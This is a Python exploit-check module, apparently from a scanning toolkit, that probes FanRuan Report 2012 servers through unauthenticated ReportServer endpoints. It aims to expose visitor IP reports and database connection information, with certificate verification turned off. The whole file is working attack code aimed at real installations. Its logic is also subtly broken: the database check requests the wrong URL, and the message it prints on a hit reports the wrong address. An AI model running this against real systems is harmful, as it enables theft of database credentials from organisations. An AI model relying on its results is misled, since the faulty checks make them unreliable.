import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 帆软_2012_信息泄露(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        }
    exp_url = urldata+"ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false"
    vuln_url = urldata+"ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
    try:
        requests.packages.urllib3.disable_warnings()
        exp = requests.get(exp_url, headers=headers, verify=False)
        vuln = requests.get(exp_url, headers=headers, verify=False)
        if exp.status_code == 200 and "网络报表" in exp.text:
            print(Vcolors.RED + "[+] 获取登录报表系统的IP:{}".format(url) +Vcolors.ENDC)
        if vuln.status_code == 200 and "connection" in vuln.text:
            print(Vcolors.RED + "[+] 数据库信息泄漏:{}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 帆软报表2012敏感泄漏漏洞不存在" + Vcolors.ENDC)
    except:
        logging.error("帆软_2012_信息泄露脚本出现异常")


